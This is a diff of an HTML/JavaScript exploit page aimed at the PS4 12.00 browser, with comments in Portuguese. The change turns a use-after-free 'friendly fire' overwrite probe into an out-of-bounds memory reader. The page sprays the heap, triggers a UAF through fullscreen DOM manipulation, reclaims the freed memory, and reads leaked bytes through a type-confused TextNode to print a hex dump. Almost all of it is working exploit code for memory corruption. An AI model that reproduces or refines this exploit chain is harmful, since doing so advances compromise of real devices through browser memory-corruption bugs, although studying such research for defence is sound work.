@@ -3,11 +3,11 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - Reclaim Friendly Fire</title>
+<title>PS4 12.00 - OOB Read Memory Dumper</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>UAF → Reclaim Overwrite → Friendly Fire Scan</h2>
+<h2>UAF → OOB Read → Memory Dumper</h2>
 <button onclick="runTest()">Run Test</button>
 
 <script>
@@ -26,7 +26,7 @@ function setupHeap(){
     let arr=[];
     for(let i=0;i<5000;i++){
         let a=new Float64Array(8);
-        a[0]=i;
+        a[0]= 0x1337BEEF; // Usamos uma assinatura mágica fácil de achar na memória
         arr.push(a);
     }
     return arr;
@@ -46,7 +46,7 @@ function setupFullscreen(){
 }
 
 // ==========================
-// 💣 RECLAIM (100% INALTERADO - Nosso novo alvo!)
+// 💣 RECLAIM (100% INALTERADO)
 function reclaim(size){
     log("[*] Reclaim size = " + size);
     for(let i=0;i<3000;i++){
@@ -78,58 +78,48 @@ function inject(child){
 }
 
 // ==========================
-// 🔬 PROBE DE FOGO AMIGO (Friendly Fire Scan)
+// 🔬 OOB READ PROBE (O RADAR)
 function domOverlapProbe(fsTarget){
-    log("---- FRIENDLY FIRE PROBE ----");
+    log("---- MEMORY DUMP PROBE ----");
 
     try{
         let n = fsTarget.firstChild;
         if(!n) return;
 
         if(n.nodeType === 3){
-            log("[!!!] TEXTNODE CONFUSION");
+            log("[!!!] TEXTNODE CONFUSION (Preparando Leitura...)");
 
-            // 💣 DISPARA O TIRO DE 4KB DE "X"
             try{
-                n.data = "X".repeat(0x1000); 
-                log("[PWN] Overwrite disparado na arena do Reclaim");
-            }catch(e){
-                log("[UAF] write crash");
-            }
+                // Em vez de ESCREVER, nós LEMOS o que o TextNode confuso acha que é o texto dele!
+                let leakedData = n.data; 
+                
+                if(!leakedData){
+                    log("[SCAN] Vazamento vazio (null/undefined)");
+                    return;
+                }
 
-            // ==========================
-            // 🔥 SCANNER DOS OBJETOS DO RECLAIM
-            try{
-                // Pega TODOS os H1 da página (isso inclui os do Reclaim)
-                let h1s = document.getElementsByTagName("h1");
-                let hits = 0;
+                log("[LEAK] Tamanho do buffer vazado: " + leakedData.length + " bytes");
 
-                for(let i=0; i<h1s.length; i++){
-                    let texto = h1s[i].textContent;
-
-                    // Pula o H1 principal da tela cheia
-                    if(texto && texto.includes("FULLSCREEN")) continue;
-
-                    // Se não tem "CONTROL", ou se tem "X", nós corrompemos ele!
-                    if(texto && (!texto.includes("CONTROL") || texto.includes("XXXX"))){
-                        
-                        log("[$$$] JACKPOT! TextNode do Reclaim corrompido!");
-                        
-                        // Imprime um preview do lixo que sobrou no objeto
-                        log("[$$$] Preview: " + texto.substring(0, 30) + "...");
-                        hits++;
-                        
-                        // Paramos no primeiro que acharmos para não inundar o log
-                        return; 
+                if(leakedData.length > 10){
+                    // Transforma os primeiros 50 caracteres do vazamento em códigos Hexadecimais para analisarmos
+                    let hexDump = [];
+                    for(let i=0; i < Math.min(leakedData.length, 50); i++){
+                        hexDump.push(leakedData.charCodeAt(i).toString(16).padStart(4, '0'));
                     }
-                }
+                    
+                    log("[DUMP] " + hexDump.join(" "));
 
-                if(hits === 0){
-                    log("[SCAN] Reclaim nodes intactos.");
+                    // Procura por assinaturas conhecidas no texto vazado
+                    if(leakedData.includes("CONTROL")){
+                        log("[$$$] Lendo memória do RECLAIM (DOM Vizinho!)");
+                    }
+                    
+                    // Nota: 0x1337BEEF em floats ou ponteiros vai parecer lixo, 
+                    // mas podemos analisar o hexDump depois.
                 }
 
             }catch(e){
-                log("[UAF] scan crash");
+                log("[UAF] read crash");
             }
         }
     }catch(e){
@@ -167,11 +157,11 @@ function trigger(fsTarget){
 }
 
 // ==========================
-// MAIN (Super limpo, sem sprays externos)
+// MAIN
 function runTest(){
-    log("[*] Iniciando teste (Friendly Fire)...");
+    log("[*] Iniciando teste (Memory Dump)...");
     
-    // Apenas aloca os arrays básicos para pressão de memória obrigatória
+    // Mantém a pressão de memória
     window.heap_press = setupHeap(); 
 
     let fsTarget=setupFullscreen();
